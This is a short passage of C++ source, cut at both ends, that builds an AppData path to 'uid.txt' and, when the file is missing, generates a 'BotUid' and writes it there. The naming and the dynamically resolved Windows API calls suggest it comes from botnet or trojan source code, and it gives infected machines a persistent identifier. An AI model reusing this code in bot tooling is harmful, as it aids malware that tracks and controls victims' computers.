	m_lstrcat(sAppData, "/uid.txt");
	DWORD attr = (DWORD)pGetFileAttributesA(sAppData);
	
	if(attr == INVALID_FILE_ATTRIBUTES)
	{
		char BotUid[100];
		GenerateUid(BotUid);
		if (File::WriteBufferA(sAppData, BotUid, m_lstrlen(BotUid))>0)
		{
			STR::Free(sAppData);
			return true;
		}
		else
		{
			STR::Free(sAppData);
			return false;
		}

	}
	else
	{
		STR::Free(sAppData);
		return true;
	}
}

